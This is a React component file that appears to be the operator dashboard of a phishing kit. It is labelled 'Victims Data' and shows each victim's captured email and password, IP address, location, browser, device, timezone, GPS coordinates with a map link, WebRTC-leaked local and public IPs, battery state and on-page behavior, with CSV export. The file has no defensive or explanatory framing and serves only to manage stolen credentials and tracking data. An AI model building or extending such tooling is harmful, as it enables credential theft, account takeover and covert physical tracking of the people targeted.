import { useState } from 'react';

/**
 * VictimTable Component
 *
 * Displays victims with IP, password, location, browser, device, timezone
 * Expandable rows show battery and device specs
 */
const VictimTable = ({ victims, pagination, onPageChange, onExport }) => {
  const [searchTerm, setSearchTerm] = useState('');
  const [expandedRows, setExpandedRows] = useState(new Set());

  // Toggle row expansion
  const toggleRow = (victimId) => {
    const newExpanded = new Set(expandedRows);
    if (newExpanded.has(victimId)) {
      newExpanded.delete(victimId);
    } else {
      newExpanded.add(victimId);
    }
    setExpandedRows(newExpanded);
  };

  // Filter victims based on search
  const filteredVictims = victims.filter((victim) => {
    const searchLower = searchTerm.toLowerCase();
    const email = victim.metadata?.formData?.email || '';
    const ip = victim.network?.ip || '';
    const city = victim.network?.city || '';
    const country = victim.network?.country_name || '';

    return (
      email.toLowerCase().includes(searchLower) ||
      ip.toLowerCase().includes(searchLower) ||
      city.toLowerCase().includes(searchLower) ||
      country.toLowerCase().includes(searchLower)
    );
  });

  return (
    <div className="apex-card">
      <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4 mb-6">
        <h3 className="text-2xl font-bold text-apex-gold">Victims Data</h3>
        <div className="flex gap-2 w-full sm:w-auto">
          <input
            type="text"
            placeholder="Search by email, IP, location..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className="apex-input text-sm flex-1 sm:flex-none sm:w-64"
          />
          <button onClick={onExport} className="apex-button text-sm px-4 py-2 whitespace-nowrap">
            Export CSV
          </button>
        </div>
      </div>

      {/* Table */}
      <div className="overflow-x-auto">
        <table className="w-full text-left text-sm">
          <thead className="text-xs uppercase bg-apex-dark text-gray-400 border-b border-apex-red/30">
            <tr>
              <th className="px-4 py-3">Email</th>
              <th className="px-4 py-3">Password</th>
              <th className="px-4 py-3">IP Address</th>
              <th className="px-4 py-3">Location</th>
              <th className="px-4 py-3">Browser</th>
              <th className="px-4 py-3">Device</th>
              <th className="px-4 py-3">Timezone</th>
              <th className="px-4 py-3 text-center">Details</th>
            </tr>
          </thead>
          <tbody>
            {filteredVictims.length > 0 ? (
              filteredVictims.map((victim) => {
                const isExpanded = expandedRows.has(victim._id);
                const email = victim.metadata?.formData?.email || 'Visitor';
                const password = victim.metadata?.formData?.password || '-';
                const maskedPassword = password !== '-' ? '••••' + password.slice(-4) : '-';
                const ip = victim.network?.ip || 'Unknown';
                const location = `${victim.network?.city || 'Unknown'}, ${victim.network?.country_name || 'Unknown'}`;
                const browser = `${victim.browser?.name || 'Unknown'} ${victim.browser?.version || ''}`.trim();
                const device = victim.device?.type || 'Unknown';
                const timezone = victim.timezoneInfo?.timezone || 'Unknown';

                return (
                  <>
                    <tr
                      key={victim._id}
                      onClick={() => toggleRow(victim._id)}
                      className="border-b border-gray-800 hover:bg-apex-dark/50 transition-colors cursor-pointer"
                    >
                      <td className="px-4 py-3 font-semibold text-apex-green">{email}</td>
                      <td className="px-4 py-3 font-mono text-red-400">{maskedPassword}</td>
                      <td className="px-4 py-3 font-mono text-xs">{ip}</td>
                      <td className="px-4 py-3 text-xs">{location}</td>
                      <td className="px-4 py-3 text-xs">{browser}</td>
                      <td className="px-4 py-3">{device}</td>
                      <td className="px-4 py-3 text-xs">{timezone}</td>
                      <td className="px-4 py-3 text-center">
                        <span className="text-apex-gold text-lg">
                          {isExpanded ? '▼' : '▶'}
                        </span>
                      </td>
                    </tr>

                    {/* Expanded Details Row */}
                    {isExpanded && (
                      <tr className="bg-apex-dark/70 border-b border-gray-800">
                        <td colSpan="8" className="px-4 py-4">
                          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 text-sm">
                            {/* Battery Info */}
                            {victim.battery && (
                              <div className="bg-gray-900/50 p-3 rounded border border-apex-green/20">
                                <h4 className="font-bold text-apex-green mb-2">🔋 Battery</h4>
                                <div className="space-y-1 text-xs text-gray-300">
                                  <p><span className="text-gray-500">Level:</span> {victim.battery.level || 'N/A'}</p>
                                  <p><span className="text-gray-500">Charging:</span> {victim.battery.charging ? 'Yes' : 'No'}</p>
                                  {victim.battery.chargingTime && victim.battery.chargingTime !== 'N/A' && (
                                    <p><span className="text-gray-500">Charge Time:</span> {victim.battery.chargingTime}</p>
                                  )}
                                </div>
                              </div>
                            )}

                            {/* Device Specs */}
                            <div className="bg-gray-900/50 p-3 rounded border border-apex-gold/20">
                              <h4 className="font-bold text-apex-gold mb-2">📱 Device Specs</h4>
                              <div className="space-y-1 text-xs text-gray-300">
                                <p><span className="text-gray-500">Type:</span> {victim.device?.type || 'Unknown'}</p>
                                <p><span className="text-gray-500">CPU Cores:</span> {victim.device?.cpuCores || 'N/A'}</p>
                                <p><span className="text-gray-500">Memory:</span> {victim.device?.memory || 'N/A'} GB</p>
                                <p><span className="text-gray-500">Touch Support:</span> {victim.device?.maxTouchPoints ? `${victim.device.maxTouchPoints} points` : 'No'}</p>
                                <p><span className="text-gray-500">Platform:</span> {victim.device?.platform || victim.os?.platform || 'Unknown'}</p>
                              </div>
                            </div>

                            {/* Screen Info */}
                            <div className="bg-gray-900/50 p-3 rounded border border-purple-500/20">
                              <h4 className="font-bold text-purple-400 mb-2">🖥️ Screen</h4>
                              <div className="space-y-1 text-xs text-gray-300">
                                <p><span className="text-gray-500">Resolution:</span> {victim.screen?.resolution || 'N/A'}</p>
                                <p><span className="text-gray-500">Available:</span> {victim.screen?.availableResolution || 'N/A'}</p>
                                <p><span className="text-gray-500">Color Depth:</span> {victim.screen?.colorDepth || 'N/A'} bit</p>
                                <p><span className="text-gray-500">Pixel Ratio:</span> {victim.screen?.pixelRatio || 'N/A'}</p>
                              </div>
                            </div>

                            {/* Geolocation */}
                            {victim.geolocation?.latitude && (
                              <div className="bg-gray-900/50 p-3 rounded border border-red-500/20">
                                <h4 className="font-bold text-red-400 mb-2">📍 GPS Location</h4>
                                <div className="space-y-1 text-xs text-gray-300">
                                  <p><span className="text-gray-500">Latitude:</span> {victim.geolocation.latitude.toFixed(6)}</p>
                                  <p><span className="text-gray-500">Longitude:</span> {victim.geolocation.longitude.toFixed(6)}</p>
                                  <p><span className="text-gray-500">Accuracy:</span> {victim.geolocation.accuracy?.toFixed(2)} m</p>
                                  <a
                                    href={`https://www.google.com/maps?q=${victim.geolocation.latitude},${victim.geolocation.longitude}`}
                                    target="_blank"
                                    className="text-blue-400 hover:underline block mt-2"
                                  >
                                    View on Google Maps →
                                  </a>
                                </div>
                              </div>
                            )}

                            {/* WebRTC */}
                            {victim.webRTC && victim.webRTC.detected && (
                              <div className="bg-gray-900/50 p-3 rounded border border-yellow-500/20">
                                <h4 className="font-bold text-yellow-400 mb-2">🌐 WebRTC</h4>
                                <div className="space-y-1 text-xs text-gray-300">
                                  <p><span className="text-gray-500">Local IPs:</span> {victim.webRTC.localIPs?.length > 0 ? victim.webRTC.localIPs.join(', ') : 'N/A'}</p>
                                  <p><span className="text-gray-500">Public IP:</span> {victim.webRTC.publicIP || 'N/A'}</p>
                                </div>
                              </div>
                            )}

                            {/* Behavior */}
                            <div className="bg-gray-900/50 p-3 rounded border border-cyan-500/20">
                              <h4 className="font-bold text-cyan-400 mb-2">👆 Behavior</h4>
                              <div className="space-y-1 text-xs text-gray-300">
                                <p><span className="text-gray-500">Mouse Moves:</span> {victim.behavior?.mouseMovements || 0}</p>
                                <p><span className="text-gray-500">Clicks:</span> {victim.behavior?.clicks || 0}</p>
                                <p><span className="text-gray-500">Scrolls:</span> {victim.behavior?.scrolls || 0}</p>
                                <p><span className="text-gray-500">Time on Page:</span> {victim.behavior?.timeOnPage || 0}s</p>
                              </div>
                            </div>
                          </div>
                        </td>
                      </tr>
                    )}
                  </>
                );
              })
            ) : (
              <tr>
                <td colSpan="8" className="px-4 py-8 text-center text-gray-500">
                  {searchTerm ? 'No results found' : 'No victims yet'}
                </td>
              </tr>
            )}
          </tbody>
        </table>
      </div>

      {/* Pagination */}
      {pagination && pagination.totalPages > 1 && (
        <div className="flex justify-between items-center mt-6 pt-4 border-t border-gray-800">
          <div className="text-sm text-gray-400">
            Page {pagination.currentPage} of {pagination.totalPages} ({pagination.totalRecords}{' '}
            total records)
          </div>
          <div className="flex gap-2">
            <button
              onClick={() => onPageChange(pagination.currentPage - 1)}
              disabled={pagination.currentPage === 1}
              className="px-4 py-2 bg-apex-darker border border-apex-red/30 rounded-lg hover:border-apex-red disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
            >
              Previous
            </button>
            <button
              onClick={() => onPageChange(pagination.currentPage + 1)}
              disabled={pagination.currentPage === pagination.totalPages}
              className="px-4 py-2 bg-apex-darker border border-apex-red/30 rounded-lg hover:border-apex-red disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
            >
              Next
            </button>
          </div>
        </div>
      )}
    </div>
  );
};

export default VictimTable;
